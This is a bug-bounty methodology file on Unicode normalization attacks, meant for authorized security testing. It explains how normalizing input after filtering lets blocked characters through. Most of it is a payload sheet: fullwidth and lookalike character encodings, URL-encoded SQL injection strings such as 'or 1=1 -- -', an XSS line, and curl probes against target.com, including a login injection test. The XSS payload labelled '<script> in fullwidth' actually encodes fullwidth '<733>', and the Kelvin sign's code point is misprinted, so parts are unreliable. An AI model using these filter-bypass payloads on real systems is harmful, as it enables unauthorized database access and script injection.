---
name: "unicode-normalization-attack"
version: "2.0"
category: "injection"
subcategory: "unicode"
phase: "exploitation"
tags: ["bug-bounty", "injection", "normalization", "unicode"]
tools: ["burp-repeater", "adb", "burp", "ghauri", "sqlmap"]
follow_up_skills: ["sqli", "xss", "xss-waf-bypass", "path-traversal"]
prerequisite_skills: ["sqli", "xss", "sql-injection", "cross-site-scripting"]
description: "Bug bounty skill: unicode normalization attack - exploitation phase, injection category"
---
# Unicode Normalization Vulnerability

## Summary

Unicode normalization ensures two strings with different binary representations for the same character have the same binary value after normalization. When a web application normalizes user input after (or before) applying security filters, an attacker can bypass those filters using alternative Unicode characters that normalize to the blocked character.

## Key Concepts

- **Code Point**: Each Unicode character is mapped to a numerical value.
- **Canonical Equivalence**: Characters assumed to have the same appearance and meaning (e.g., `ü` as U+00FC vs `u` + combining diaeresis U+0308).
- **Compatibility Equivalence**: Weaker equivalence — characters may represent the same abstract character but display differently (e.g., `ﬁ` ligature vs `f` + `i`).
- **Normalization Forms**: NFC, NFD, NFKC, NFKD — each applies canonical/compatibility normalization differently.
- **Bypass Vector**: Send a blocked character (`, ", etc.) as a visually distinct Unicode code point that normalizes to it after filtering.

## Technical Details

### Unicode Encoding

- **UTF-8**: Variable-width (1–4 bytes), compatible with ASCII in the 1-byte range.
- **UTF-16**: Minimum 2 bytes (up to 4).
- **UTF-32**: Fixed 4 bytes for all characters.
- The system must correctly identify the encoding to convert byte streams to characters.

### How Normalization Works

Two different byte sequences can represent the same character. For example, the character `Å` (A with ring) can be encoded as:
- U+00C5 (pre-composed, 1 code point)
- U+0041 + U+030A (A + combining ring above, 2 code points)

After NFC normalization, both become U+00C5. After NFD normalization, both become U+0041 + U+030A.

## Detection

Send a Unicode character known to normalize to a different character and observe if it is transformed:

1. Send `KELVIN SIGN` (U+0212A, UTF-8: `%e2%84%aa`) — normalizes to `K`. If `K` is echoed back, normalization is active.

2. Send `%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83` — normalizes to *Leonishan*. If that string is reflected, normalization is confirmed.

## Exploitation Payloads

### SQL Injection via Unicode Normalization

If the app strips `'` but normalizes afterward, use Unicode characters that normalize to `'`, `"`, `|`, `=`, `/`, `-`, `#`, `*`.

**Useful Unicode characters:**

| Normalizes To | UTF-8 Encoded |
|---------------|---------------|
| `'` (0x27) | `%ef%bc%87` |
| `"` (0x22) | `%ef%bc%82` |
| `\|` (0x7C) | `%ef%bd%9c` |
| `=` (0x3D) | `%e2%81%bc` |
| `/` (0x2F) | `%ef%bc%8f` |
| `-` (0x2D) | `%ef%b9%a3` |
| `#` (0x23) | `%ef%b9%9f` |
| `*` (0x2A) | `%ef%b9%a1` |
| `o` | `%e1%b4%bc` |
| `r` | `%e1%b4%bf` |
| `1` | `%c2%b9` |

**`' or 1=1 -- -` using Unicode normalization bypass:**

```
%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3
```

**`" or 1=1 -- -` using Unicode normalization bypass:**

```
%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3
```

**`' || 1==1 //` using Unicode normalization bypass:**

```
%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```

**`" || 1==1 //` using Unicode normalization bypass:**

```
%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```

### XSS via Unicode Normalization

Characters like `¬` (not sign) or `%e2%89%ae` (≮, not less-than) may normalize to characters useful in XSS constructs.

```
%ef%bc%9c%ef%bc%97%ef%bc%93%ef%bc%93%ef%bc%9e  <!-- <script> in fullwidth -->
```

## Methodology

1. Identify input fields where the value is reflected or used in a security-sensitive operation (SQL query, HTML rendering, header emission).

2. Send a normalization probe (e.g., KELVIN SIGN `%e2%84%aa`) and check if `K` is returned.

3. If normalization is confirmed, identify which characters are blocked or filtered by the application.

4. Find Unicode code points that normalize to the blocked character using an equivalence table (https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html).

5. Replace blocked characters with their normalized alternatives in payloads.

6. Test original payload vs normalized version — if the normalized version bypasses the filter but the app normalizes it to the original intended character, the bypass works.

## Commands

```bash
# Probe for normalization — Kelvin sign normalizes to K
curl -s "https://target.com/search?q=%e2%84%aa" | grep -o "K"

# Probe with Leonishan string
curl -s "https://target.com/search?q=%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83"

# Test SQLi bypass — single quote equivalent
curl -s "https://target.com/login?user=%ef%bc%87+or+1=1--"
```

## Tools

- **Unicode equivalence table**: https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
- **Unicode code point converter**: https://www.compart.com/en/unicode/

## Bypass Techniques

- **Normalization after sanitization**: If the app strips `'` then normalizes, inject a fullwidth apostrophe `%ef%bc%87` — normalization converts it to `'` after the strip.
- **Normalization before validation**: If the app normalizes then checks an allowlist, double-encoding or alternative forms may survive both passes.
- **Combining marks abuse**: Split character into base + combining mark (e.g., `c` + combining cedilla) — both forms may bypass different filters.

## Not a Finding If

- **Input is reflected exactly as sent** — Normalization probe character (e.g., KELVIN SIGN) appears unchanged in the response.
- **Normalization is applied consistently before all security checks** — If normalization happens before input validation, no bypass exists.
- **No security-relevant operation uses the normalized value** — Normalization may occur for display purposes only.

## Notes

- Unicode normalization bypasses are subtle and depend on the order of operations: filter → normalize vs normalize → filter matter.
- Fullwidth characters (U+FF01–U+FF5E) normalize to their ASCII equivalents and are the easiest bypass vector.
- Combining marks can be appended to a base character without changing its visual appearance in most fonts, creating invisible attack surfaces.

## References

- https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
- https://unicode.org/reports/tr15/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Unicode%20Normalization
